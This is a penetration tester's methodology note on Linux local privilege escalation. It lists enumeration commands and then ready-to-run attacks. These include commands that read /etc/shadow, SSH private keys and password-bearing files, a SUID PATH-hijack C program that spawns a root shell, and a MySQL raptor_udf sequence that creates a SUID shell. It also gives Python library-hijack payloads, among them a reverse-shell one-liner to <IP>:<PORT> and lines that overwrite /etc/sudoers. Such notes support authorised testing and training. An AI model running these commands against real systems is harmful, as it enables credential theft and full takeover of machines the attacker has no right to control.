# Linux - Local Privilege Escalation

The following note assumes that a low privilege shell could be obtained on the
target. Some privilege techniques detailed rely on a fully TTY shell.  

To leverage a shell from a Remote Code Execution (RCE) vulnerability please
refer to the `[General] Shells` note.

“The more you look, the more you see.”  
― Pirsig, Robert M., Zen and the Art of Motorcycle Maintenance

### Enumeration

###### Basic enumeration

| Description | Command |
|-------------|---------|
| OS | cat /etc/*-release <br/>cat /etc/lsb-release |
| Kernel | uname -a <br/> cat /proc/version <br/> rpm -q kernel |
| Current user | id <br/>whoami |
| All users    | cat /etc/passwd |
| Current user sudo rights | sudo -l |
| Sudo configuration – Privileged command | cat /etc/sudoers |
| Super users | awk -F: '($3 == "0") {print}' /etc/passwd |
| Logged in users | who -a <br/> w <br/> finger <br/> pinky <br/> users |
| Logged in history from /var/log/lastlog | lastlog <br/> lastlog PIPE grep -v "Never" |
| Users hashes – Privileged command | cat /etc/shadow <br/> (AIX Linux) cat /etc/security/passwd	|

###### Writable directories

Being able to write files on the system is needed for scripting the enumeration
process and exploiting kernel vulnerabilities.  

The following directories are usually writable to all:

```
/dev/shm
/tmp
```

To find directories the current user can write into:

```
find / -perm -2 -type d 2>/dev/null
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -lahd {} \; 2>/dev/null
```

###### Enumeration scripts

Most of the enumeration process detailed below can be automated using scripts.

*Personal preference: LinEnum.sh + BeRoot.py
(if python available; Embeds linux-exploit-suggester.sh) > LinEnum.sh +
linux-exploit-suggester.sh (on remote box or locally) > others*

To upload the scripts on the target, please refer to the [General] File transfer
note.  

The **LinEnum.sh** script enumerates the system configuration using more than
65 checks (OS & kernel information, home directories, sudo acces, SUID/GUID
files, configuration files, etc.).

```
-t	Thorough tests (notably SUID/GUID files)
-r	Report name
[-k	Keyword to grep in enumerated configuration files]

LinEnum.sh -t -k 'pass' -r <PATH/FILENAME>
```

The **linux-exploit-suggester.sh** script runs privilege escalation checks to
recommend kernel and packages privilege escalation exploits.  
Script needs Bash in version 4.0 or newer. The linux-exploit-suggester.sh
is maintained.  
The script can be used off the targeted box, by gathering the OS, Kernel and
installed packages versions:

```
(target box) $ uname -a
# Get packages list - Refer to the [General] File transfer note to transfer the file
[Debian / Ubuntu] (target box) $ dpkg -l > <PACKAGE_LIST>
[RedHat / CentOS  / Fedora ] (target box) $ rpm -qa > <PACKAGE_LIST>

linux-exploit-suggester.sh --full --uname "<UNAME>" --pkglist-file <DPKGOUT_FILE>
```

Or directly on the targeted box:

```
/linux-exploit-suggester.sh --full
```

The **BeRoot.py** script enumerates common misconfigurations, with a bit more
advanced checks (GTFOBins, NFS Root Squashing, etc.) details than LinEnum.sh.
Embeds linux-exploit-suggester to give an overview of potential CVE that
affect the kernel.

```
TODO
```

The **Linuxprivchecker.py** script enumerates the system configuration and,
its true added value, runs privilege escalation checks to recommend kernel
privilege escalation exploits.  
The linux-exploit-suggester.py is not maintained.

```
python Linuxprivchecker.py
```

The **linux-soft-exploit-suggester** finds exploits for vulnerable packages in
a Linux system. It focuses on software packages instead of Kernel
vulnerabilities. It uses the exploit-db database to evaluate the security of
packages and search for exploits, so an export of available exploits must be
provided to the script:

```
# Generate the exploit-db CSV list locally
python linux-soft-exploit-suggester.py --update

# Get packages list - Refer to the [General] File transfer note to transfer the file
[Debian / Ubuntu] (target box) $ dpkg -l > <PACKAGE_LIST>
[RedHat / CentOS / Fedora ] (target box) $ rpm -qa > <PACKAGE_LIST>

python linux-soft-exploit-suggester.py --file <PACKAGE_LIST> --db files_exploits.csv
```

### File systems

###### Mounted partitions and drives

The following commands can be used to display all mounted file systems:

```
# Human readable
df -aTh

# Both equivalent
mount
cat /proc/mounts
```

###### Clear text passwords in files

Search for clear text passwords stored in files. Use the keyword 'password'
first and broaden the search if needed by searching for 'pass':

```
# Restrict the search to configuration files
find / -name "*.conf" -print0 | xargs -0 grep -Hi "password"
find / -name "*.conf" -print0 | xargs -0 grep -Hi "pass"

# All files
find / -type f -print0 | xargs -0 grep -Hi "pass"
find / -type f -print0 | xargs -0 grep -Hi "password"

# PHP MySQL connect for Linux Apache MySQL PHP (LAMP) server
find / -type f -name "*.php" -print0 | xargs -0 grep -Hi "mysql_connect"
```

###### Users home directories content

The users home directories may contain sensible information such as config files
or history files.  
The following commands can be used to display the content of the users home
directories:

```bash
# Home
ls -lahR /root
ls -lahR /home
find /home -type f -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t
tree -pugfai /home

# Histories
find /home -name "*history*" -print -exec cat {} 2>/dev/null \;
cat ~/.bash_history
cat ~/.sh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

###### SSH private-keys and configurations

```
# id_rsa, id_dsa, authorized_keys, etc.
ls -lah ~/.ssh/
find /home -name "*id_rsa*" -print -exec cat {} 2>/dev/null \;
find /home -name "*id_dsa*" -print -exec cat {} 2>/dev/null \;

# ssh_config, sshd_config, ssh_host_rsa_key, ssh_host_dsa_key, etc.
ls -lah /etc/ssh/
```

###### Services configuration

The following commands can be used to list the configuration files present on
the system.  
The files in the /etc folder are more likely to be active
configurations and should be reviewed first.

```
find /etc -name '*.conf' -exec ls -lah {} 2>/dev/null \;
find / -name '*.conf' -exec ls -lah {} 2>/dev/null \;
```

###### Hidden files

To list the hidden files present on the system:

```
find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \;
```

###### World-writeable and "nobody" files

The following commands can be used to list the files that are world writeable or
that do not have a owner:

```
# All world-writable files excluding /proc and /sys
find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null

# No owner files
find / -xdev \( -nouser -o -nogroup \) -print
```

###### Others files of potential interest

The following files and directories may contain interesting information:

```
/var/mail/
/var/www/
/var/log/
/etc/httpd/logs/
```

### SUID/SGID Privileges Escalation

###### Find SUID/GUID files and directories

The find CLI tool can be used to list the SUID/GUID binaries present on the
system:

```
# Files SUID
find / -user root -perm -4000 -ls 2>/dev/null
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -type f -user root -perm -4000 -exec stat -c "%A %a %n" {} \; 2>/dev/null

# Files SGID
find / -user root -perm -2000 -ls 2>/dev/null
find / -type f -user root -perm -2000 -exec stat -c "%A %a %n" {} \; 2>/dev/null

# Both
find / -user root -perm -6000 -ls 2>/dev/null
find / -type f -user root -perm -6000 -exec stat -c "%A %a %n" {} \; 2>/dev/null
```

Look for "GTFOBins" or any unusual binaries in the list of SUID/GUID files
enumerated.

###### "GTFOBins"

The "GTFOBins" are binaries that can be used to bypass local security
restrictions and notably escape to shell.  

The following binaries can be exploited to elevate privileges on the
system if run with the SUID/SGID bit set:

| | | | | | | | | | |
|-|-|-|-|-|-|-|-|-|-|
| aria2c | ash | awk | base64 | bash | busybox | cat | chmod | chown | cp |
| csh | curl | cut | dash | date | dd | diff | dmsetup | docker | ed |
| emacs | env | expand | expect | find | flock | fmt | fold | gdb | git |
| grep | head | ionice | jjs | jq | jrunscript | ksh | ld.so | less | lua |
| make | more | mv | mysql | nano | nc | nice | nl | nmap | node |
| od | perl | pg | php | pic | pico | python | rlwrap | rpm | rpmquery |
| rsync | run-parts | scp | sed | setarch | shuf | socat | sort | sqlite3 | start-stop-daemon |
| stdbuf | strace | tail | tar | taskset | tclsh | tee | telnet | tftp | time |
| timeout | ul | unexpand | uniq | unshare | vi | vim | watch | watch | wget |
| xargs | xxd | zip | zsh |  

For the privileges escalation sequences please refer to:

```
https://gtfobins.github.io/
(Source https://github.com/GTFOBins/GTFOBins.github.io)
```

###### PATH exploit

If a binary with the SUID/SGID bit set runs another binary with out
specifying its full path, it can be leveraged to escalate privileges on the
system.  
The vulnerability arise because the Linux operating system relies on the
current user path environment variable to find the binary called and not the
path of the owner of the SUID/SGID binary.

To detect that a SUID/SGID binary is calling others binaries with out
specifying their full path, the Linux strings tool can be used:

```
strings <SUIDBINARY>

# Example of a vulnerable call
cp /etc/shadow /etc/shadow.bak
```

The exploit sequence is as follow:

1. Include a writable by the current user folder in the PATH environment
   variable.  
   Do not use a folder writable by all as it could be used against the current
   user and would lower the system security level.  
   `export PATH=/home/<USERNAME>:$PATH`

2. Create a binary named after the binary called by the SUID/SGID binary in the
   added folder.   
   If the arguments used for the call permit it, `bash` or `sh` can be used
   directly.  
   If not, the following C code can be used to compile a binary or a shell elf
   can be used ([General] Shells note):

   ```
   #include <stdlib.h>
   #include <unistd.h>

   void main () {
     setuid(0);
     system("/bin/bash");
   }
   ```

3. Run the vulnerable SUID/SGID binary

### Unpatched kernel and services

###### Compilers/languages installed/supported

The supported languages may be leveraged to compile exploit against the
operating system / kernel and services.  

To find out which compilers / languages can be used:

```bash
# All-in-one
find / -type f \( -name "gcc" -or -name "g++" -or -name "clang" -or -name "python" -or -name "python2" -or -name "python3" -or -name "ruby" -or -name "perl" -or -name "php" \) -exec  ls -lah {} \; 2>/dev/null

# C / C++
find / -name gcc* 2>/dev/null
find / -name g++* 2>/dev/null
find / -name clang* 2>/dev/null

# Python
python --version
find / -name python* 2>/dev/null

# Ruby
ruby --version
find / -name ruby* 2>/dev/null

# Perl
perl --version
find / -name perl* 2>/dev/null

# PHP
php --version
find / -name php* 2>/dev/null
```

If no compilers are available on the system, it is recommended to compile the
exploit on a similar kernel and upload the binary to the target,  refer to
the `General - File transfer` note to do so.

Verify the transferred binary integrity using the Linux builtin `md5sum`.

###### OS and kernel versions

To retrieve the Linux operating system and kernel versions:

```
cat /etc/*-release
cat /etc/lsb-release
uname -a
cat /proc/version
rpm -q kernel
```

###### Installed packages and binaries

The installed programs should be reviewed for potential known vulnerabilities.    
To review the installed programs on the target:

```bash
dpkg -l
dpkg -l <PACKAGE_NAME>

apt list --installed

rpm -qa

ls -lah /usr/bin
ls -lah /usr/sbin
```

###### Exploits detection tools

The enumeration scripts linux-exploit-suggester.sh can be used on or off target,
if provided with the `uname -a` output and the installed packages list
(`dpkg -l` or `rpm -qa` command output), to enumerate potential exploits for
the targeted box.   

Refer to the "Enumeration - Enumeration scripts" part above for more information
and usage guides to the most well known local exploit suggester scripts.  

###### File transfer

To transfer the exploit code on the target box, refer to the `General - File
transfer` note.

### Processes and services

###### Enumerate running processes and services

The processes and services running should be reviewed for known exploits, with
a special attention given to the processes running under root privileges.
The command line arguments used to start the process should be reviewed for
sensible information.  

The current processes can be listed using the `ps` Linux utility:

```
# Processes - equivalent ouput between -aux / -ef
ps -aux
ps -ef  
ps -aux | grep root
ps -ef | grep root

# Listening services
netstat -antup
ss -twurp
```

###### MySQL

If a `MySQL` service is running under root privileges and `MySQL` credentials for
an user with FILE privileges are known, local privilege escalation can be
achieved.

Refer to the `File system - Clear text passwords in files` part above for
finding potential MySQL credentials present on the server. A blank password for
the root user account is worth trying as well, especially if the `MySQL`
service is only exposed locally on the server.

The `raptor_udf.c` (https://www.exploit-db.com/raw/1518) dynamic library can
be used to leverage those pre requisites to conduct a local privilege
escalation.

```
gcc -g -c raptor_udf.c
gcc -g -shared -W1,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
# Do not forget to change <PATH>
mysql> insert into foo values(load_file('<PATH>/raptor_udf.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf.so';
mysql> create function do_system returns integer soname 'raptor_udf.so';
mysql> select * from mysql.func;
* +-----------+-----+---------------+----------+
* | name      | ret | dl            | type     |
* +-----------+-----+---------------+----------+
* | do_system |   2 | raptor_udf.so | function |
* +-----------+-----+---------------+----------+

# Test the privileges obtained
mysql> select do_system('id > /tmp/out; chmod 0755 /tmp/out');

# Refer to General - Shells - Binary - Linux C binary for SUID shell for the source C code for the SUID sh binary  
mysql> select do_system('chown root.root /tmp/suid; chmod 4755 /tmp/suid');

mysql> \! sh  
sh$ /tmp/suid
```

### Sudo

### Init.d

### Cron jobs and Scheduled tasks

Look for tasks running as root from script that you can modify:

```bash
crontab -l
ls -lah /var/spool/cron
ls -lahR /var/spool/cron
ls -al /etc/ | grep cron
grep -i CRON /var/log/syslog
cat /etc/cron*
cat /var/spool/cron/crontabs/root
```

### Python library hijacking

When importing a library, using `import <LIBRARY_NAME>`, the Python interpreter
will first search in the interpreted script folder for the library and then
cycle through a predefined list of libraries folders.

A Python library hijacking can be leveraged to elevate privileges on the system
whenever the current user has write access either in the Python libraries
import folders or in the directory of a Python script that can (`sudo` and
`suid`) or will (`cron`, `init.d`, etc.) be run with higher privileges.

The following commands can be used to enumerate the Python import libraries
folders and list their access rights:

```
python -c 'import sys; print sys.path'
python -c 'import sys; print "\n".join(sys.path)' | xargs ls -ld
```

Potentially exploitable Python scripts should be identified when conducting the
privileges escalation methodology. Additionally, the `find` Linux built-in can
be used to exhaustively list all Python scripts present on the system as well as
folders containing a Python and writable by the current user for further
investigation:

```
# List all Python scripts present on the system
find / -name '*.py' | grep -v -e "/usr/lib/python\|/usr/local/lib/python"

# List all folders writable by the current user that contains a Python script
find / -name '*.py' -printf "%h\0"  2>/dev/null | xargs -0 sh -c 'for p; do [ -w "$p" ] && echo "$p"; done' - | sort -u
```

In order to successfully exploit a Python library hijacking, it is recommended
to completely copy the hijacked library, only adding a payload to the existing
library code.
The following payloads can be used:

```
# Add current user to the suoders
/bin/echo "<USERNAME>    ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers

# Reverse shell one-liner
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

For more Python reverse shell payloads, refer to the `[General] Shells` note.

### Root write access

/bin/echo "friend    ALL=(ALL:ALL) ALL" > /etc/sudoers
